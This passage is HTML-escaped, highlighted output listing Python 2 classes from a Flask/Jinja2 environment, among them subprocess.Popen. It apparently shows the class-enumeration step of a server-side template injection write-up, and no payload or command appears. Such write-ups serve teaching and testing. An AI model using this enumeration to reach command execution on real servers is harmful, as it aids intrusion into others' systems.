class="string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;super&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;xrange&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;set&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;float&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;long&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;property&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;code&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;function&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;module&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.stat_result&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.statvfs_result&#x27;</span>&gt;, &lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">warnings</span>.<span class="title">WarningMessage</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">warnings</span>.<span class="title">catch_warnings</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">_weakrefset</span>.<span class="title">_IterationGuard</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">_weakrefset</span>.<span class="title">WeakSet</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">_abcoll</span>.<span class="title">Hashable</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">classmethod</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">_abcoll</span>.<span class="title">Iterable</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">_abcoll</span>.<span class="title">Sized</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">_abcoll</span>.<span class="title">Container</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">_abcoll</span>.<span class="title">Callable</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">dict_keys</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">dict_items</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">dict_values</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">site</span>.<span class="title">_Printer</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">site</span>.<span class="title">_Helper</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_sre</span>.<span class="title">SRE_Pattern</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_sre</span>.<span class="title">SRE_Match</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_sre</span>.<span class="title">SRE_Scanner</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">site</span>.<span class="title">Quitter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">codecs</span>.<span class="title">IncrementalEncoder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">codecs</span>.<span class="title">IncrementalDecoder</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">functools</span>.<span class="title">partial</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">operator</span>.<span class="title">itemgetter</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">operator</span>.<span class="title">attrgetter</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">operator</span>.<span class="title">methodcaller</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">collections</span>.<span class="title">deque</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">deque_iterator</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">deque_reverse_iterator</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">combinations</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">combinations_with_replacement</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">cycle</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">dropwhile</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">takewhile</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">islice</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">starmap</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">imap</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">chain</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">compress</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">ifilter</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">ifilterfalse</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">count</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">izip</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">izip_longest</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">permutations</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">product</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">repeat</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">groupby</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">tee_dataobject</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">tee</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">_grouper</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_thread</span>.<span class="title">_localdummy</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">thread</span>.<span class="title">_local</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">thread</span>.<span class="title">lock</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">Struct</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_json</span>.<span class="title">Scanner</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_json</span>.<span class="title">Encoder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">json</span>.<span class="title">decoder</span>.<span class="title">JSONDecoder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">json</span>.<span class="title">encoder</span>.<span class="title">JSONEncoder</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">time</span>.<span class="title">struct_time</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">threading</span>.<span class="title">_Verbose</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">cPickle</span>.<span class="title">Unpickler</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">cPickle</span>.<span class="title">Pickler</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">cStringIO</span>.<span class="title">StringO</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">cStringIO</span>.<span class="title">StringI</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">string</span>.<span class="title">Template</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">string</span>.<span class="title">Formatter</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_ssl</span>.<span class="title">_SSLContext</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_ssl</span>.<span class="title">_SSLSocket</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">socket</span>.<span class="title">_closedsocket</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_socket</span>.<span class="title">socket</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">method_descriptor</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">socket</span>.<span class="title">_socketobject</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">socket</span>.<span class="title">_fileobject</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">urlparse</span>.<span class="title">ResultMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">contextlib</span>.<span class="title">GeneratorContextManager</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">contextlib</span>.<span class="title">closing</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">utils</span>.<span class="title">MissingType</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">utils</span>.<span class="title">LRUCache</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">utils</span>.<span class="title">Cycler</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">utils</span>.<span class="title">Joiner</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">utils</span>.<span class="title">Namespace</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">markupsafe</span>.<span class="title">_MarkupEscapeHelper</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">nodes</span>.<span class="title">EvalContext</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_hashlib</span>.<span class="title">HASH</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">nodes</span>.<span class="title">Node</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_random</span>.<span class="title">Random</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">runtime</span>.<span class="title">TemplateReference</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">environment</span>.<span class="title">Environment</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">runtime</span>.<span class="title">Context</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">runtime</span>.<span class="title">BlockReference</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">runtime</span>.<span class="title">LoopContextBase</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">runtime</span>.<span class="title">LoopContextIterator</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">runtime</span>.<span class="title">Macro</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">runtime</span>.<span class="title">Undefined</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">numbers</span>.<span class="title">Number</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">decimal</span>.<span class="title">Decimal</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">decimal</span>.<span class="title">_ContextManager</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">decimal</span>.<span class="title">Context</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">decimal</span>.<span class="title">_WorkRep</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">decimal</span>.<span class="title">_Log10Memoize</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_ast</span>.<span class="title">AST</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">lexer</span>.<span class="title">Failure</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">lexer</span>.<span class="title">TokenStreamIterator</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">lexer</span>.<span class="title">TokenStream</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">lexer</span>.<span class="title">Lexer</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">parser</span>.<span class="title">Parser</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">visitor</span>.<span class="title">NodeVisitor</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">idtracking</span>.<span class="title">Symbols</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">compiler</span>.<span class="title">MacroRef</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">compiler</span>.<span class="title">Frame</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">environment</span>.<span class="title">Template</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">environment</span>.<span class="title">TemplateModule</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">environment</span>.<span class="title">TemplateExpression</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">environment</span>.<span class="title">TemplateStream</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">loaders</span>.<span class="title">BaseLoader</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_io</span>.<span class="title">_IOBase</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_io</span>.<span class="title">IncrementalNewlineDecoder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">bccache</span>.<span class="title">Bucket</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">bccache</span>.<span class="title">BytecodeCache</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">LogRecord</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">Formatter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">BufferingFormatter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">Filter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">Filterer</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">PlaceHolder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">Manager</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">logging</span>.<span class="title">LoggerAdapter</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">datetime</span>.<span class="title">date</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">datetime</span>.<span class="title">timedelta</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">datetime</span>.<span class="title">time</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">datetime</span>.<span class="title">tzinfo</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">_internal</span>.<span class="title">_Missing</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">_internal</span>.<span class="title">_DictAccessorProperty</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">ImmutableListMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">ImmutableDictMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">UpdateDictMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">ViewItems</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">_omd_bucket</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">Headers</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">ImmutableHeadersMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">IfRange</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">Range</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">ContentRange</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">datastructures</span>.<span class="title">FileStorage</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">email</span>.<span class="title">LazyImporter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">calendar</span>.<span class="title">Calendar</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">urls</span>.<span class="title">Href</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">utils</span>.<span class="title">HTMLBuilder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">accept</span>.<span class="title">AcceptMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">auth</span>.<span class="title">AuthorizationMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">auth</span>.<span class="title">WWWAuthenticateMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wsgi</span>.<span class="title">ClosingIterator</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wsgi</span>.<span class="title">FileWrapper</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wsgi</span>.<span class="title">_RangeWrapper</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">middleware</span>.<span class="title">dispatcher</span>.<span class="title">DispatcherMiddleware</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">middleware</span>.<span class="title">http_proxy</span>.<span class="title">ProxyMiddleware</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">middleware</span>.<span class="title">shared_data</span>.<span class="title">SharedDataMiddleware</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">formparser</span>.<span class="title">FormDataParser</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">formparser</span>.<span class="title">MultiPartParser</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">base_request</span>.<span class="title">BaseRequest</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">base_response</span>.<span class="title">BaseResponse</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">common_descriptors</span>.<span class="title">CommonRequestDescriptorsMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">common_descriptors</span>.<span class="title">CommonResponseDescriptorsMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">etag</span>.<span class="title">ETagRequestMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">etag</span>.<span class="title">ETagResponseMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">user_agent</span>.<span class="title">UserAgentMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">request</span>.<span class="title">StreamOnlyMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">response</span>.<span class="title">ResponseStream</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">wrappers</span>.<span class="title">response</span>.<span class="title">ResponseStreamMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">exceptions</span>.<span class="title">Aborter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">uuid</span>.<span class="title">UUID</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">CArgObject</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_ctypes</span>.<span class="title">CThunkObject</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_ctypes</span>.<span class="title">_CData</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_ctypes</span>.<span class="title">CField</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_ctypes</span>.<span class="title">DictRemover</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">ctypes</span>.<span class="title">CDLL</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">ctypes</span>.<span class="title">LibraryLoader</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">select</span>.<span class="title">epoll</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">subprocess</span>.<span class="title">Popen</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">itsdangerous</span>.<span class="title">_json</span>.<span class="title">_CompactJSON</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">itsdangerous</span>.<span class="title">signer</span>.<span class="title">SigningAlgorithm</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">itsdangerous</span>.<span class="title">signer</span>.<span class="title">Signer</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">itsdangerous</span>.<span class="title">serializer</span>.<span class="title">Serializer</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">itsdangerous</span>.<span class="title">url_safe</span>.<span class="title">URLSafeSerializerMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">flask</span>.<span class="title">_compat</span>.<span class="title">_DeprecatedBool</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">local</span>.<span class="title">Local</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">local</span>.<span class="title">LocalStack</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">local</span>.<span class="title">LocalManager</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">local</span>.<span class="title">LocalProxy</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">ast</span>.<span class="title">NodeVisitor</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">difflib</span>.<span class="title">HtmlDiff</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">routing</span>.<span class="title">RuleFactory</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">routing</span>.<span class="title">RuleTemplate</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">routing</span>.<span class="title">BaseConverter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">routing</span>.<span class="title">Map</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">werkzeug</span>.<span class="title">routing</span>.<span class="title">MapAdapter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">_compat</span>.<span class="title">_FixupStream</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">_compat</span>.<span class="title">_AtomicFile</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">utils</span>.<span class="title">LazyFile</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">utils</span>.<span class="title">KeepOpenFile</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">click</span>.<span class="title">utils</span>.<span class="title">PacifyFlushWrapper</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span 